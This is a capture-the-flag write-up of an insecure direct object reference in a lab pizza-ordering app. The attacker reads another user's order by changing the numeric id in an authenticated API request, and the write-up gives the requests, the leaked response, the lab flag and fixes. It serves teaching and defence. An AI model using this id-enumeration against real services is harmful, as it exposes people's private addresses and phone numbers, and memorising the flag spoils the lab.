# Cheesy Does It - IDOR Writeup

## Summary

The first BugForge lab was a pizza ordering application named **Cheesy Does It**. The vulnerability was an insecure direct object reference (IDOR) in the order details endpoint.

After registering a normal user account, I was able to request another user's order directly by changing the numeric order id in:

```http
GET /api/orders/1
Authorization: Bearer <normal-user-token>
```

The API returned an order owned by a different user and included the flag.

## Flag

```text
bug{RvVOU26CzbIy9TTFfehsXvASNpEjcYBg}
```

## Target

```text
https://lab-1778525273064-kdqex7.labs-app.bugforge.io/login
```

## Hint

```text
IDOR. Can you view things that don't belong to you?
```

## Walkthrough

### 1. Initial Recon

I opened the target and found a login page for a pizza delivery application:

```text
Cheesy Does It - Premium Pizza Delivery
```

The login page also had a registration link:

```text
/register
```

Since no credentials were provided, I created a new normal user account.

### 2. Inspecting the Frontend

The app loaded a bundled JavaScript file:

```text
/static/js/main.54785890.js
```

Inspecting the bundle revealed the main API routes used by the frontend:

```text
/api/login
/api/register
/api/verify-token
/api/menu/pizzas
/api/menu/bases
/api/menu/sauces
/api/menu/toppings
/api/payment/validate
/api/payment/process
/api/orders
/api/orders/:orderId
/api/profile
/api/admin/stats
/api/admin/users
/api/admin/orders
```

The important route was:

```text
GET /api/orders/:orderId
```

The frontend used that route when clicking **View Details** for an order:

```javascript
Eo.get("/api/orders/".concat(orderId))
```

This matched the challenge hint because order ids are direct object references.

### 3. Registering a Normal User

I registered a new account through the API:

```http
POST /api/register
Content-Type: application/json
```

Example body:

```json
{
  "username": "idor1778525654528",
  "email": "idor1778525654528@example.com",
  "password": "Password123!",
  "full_name": "IDOR Tester",
  "phone": "5551234",
  "address": "123 Main St"
}
```

The server returned a normal user and a JWT:

```json
{
  "token": "<jwt>",
  "user": {
    "id": 5,
    "username": "idor1778525654528",
    "email": "idor1778525654528@example.com",
    "full_name": "IDOR Tester",
    "phone": "5551234",
    "address": "123 Main St"
  }
}
```

My user id was `5`, and this new account had no orders.

### 4. Checking My Own Orders

Using the returned token, I requested my order history:

```http
GET /api/orders
Authorization: Bearer <jwt>
```

The response was empty:

```json
[]
```

That meant any readable existing order id would likely belong to another user.

### 5. Testing for IDOR

I then requested a direct order id:

```http
GET /api/orders/1
Authorization: Bearer <jwt>
```

Expected secure behavior would be either:

```http
403 Forbidden
```

or:

```http
404 Not Found
```

Instead, the application returned another user's order.

### 6. Vulnerable Response

The response for `/api/orders/1` included order details for `user_id: 4`, even though I was authenticated as user `5`:

```json
{
  "id": 1,
  "user_id": 4,
  "order_number": "CDI-1778525678796-0JHVC8BHV",
  "total_price": 25.98,
  "status": "received",
  "delivery_address": "sdggj",
  "phone": "adhf",
  "payment_method": "card",
  "notes": "",
  "created_at": "2026-05-11 18:54:38",
  "updated_at": "2026-05-11 18:54:38",
  "items": [
    {
      "id": 1,
      "order_id": 1,
      "pizza_name": "Pepperoni Classic",
      "base_name": "Hand Tossed",
      "sauce_name": "Classic Tomato",
      "size": "Medium",
      "quantity": 1,
      "unit_price": 12.99,
      "total_price": 12.99,
      "toppings": "Extra Mozzarella, Pepperoni"
    },
    {
      "id": 2,
      "order_id": 1,
      "pizza_name": "Pepperoni Classic",
      "base_name": "Hand Tossed",
      "sauce_name": "Classic Tomato",
      "size": "Medium",
      "quantity": 1,
      "unit_price": 12.99,
      "total_price": 12.99,
      "toppings": "Extra Mozzarella, Pepperoni"
    }
  ],
  "flag": "bug{RvVOU26CzbIy9TTFfehsXvASNpEjcYBg}"
}
```

The presence of `user_id: 4` confirmed that the endpoint did not enforce ownership checks.

## Root Cause

The vulnerable endpoint likely checked that the requester was authenticated, but did not verify that the requested order belonged to the authenticated user.

The vulnerable logic was probably similar to:

```sql
SELECT * FROM orders WHERE id = ?
```

Instead, it should have enforced ownership:

```sql
SELECT * FROM orders WHERE id = ? AND user_id = ?
```

## Impact

Any authenticated user could enumerate order ids and view other users' private order data, including:

- Order numbers
- Delivery addresses
- Phone numbers
- Order items
- Payment method metadata
- The challenge flag

## Remediation

The backend should enforce object-level authorization on every user-owned resource.

For this endpoint, the server should compare the requested order's `user_id` against the authenticated user's id before returning data.

Recommended fixes:

- Add an ownership check to `GET /api/orders/:orderId`.
- Return `404` or `403` when the order does not belong to the current user.
- Avoid exposing sensitive fields unless required.
- Add automated tests for cross-user access attempts.

Example secure logic:

```javascript
const order = await db.get(
  "SELECT * FROM orders WHERE id = ? AND user_id = ?",
  [orderId, req.user.id]
);

if (!order) {
  return res.status(404).json({ error: "Order not found" });
}
```

## Final Result

The flag was retrieved by authenticating as a normal user and directly requesting another user's order:

```text
/api/orders/1
```

Final flag:

```text
bug{RvVOU26CzbIy9TTFfehsXvASNpEjcYBg}
```
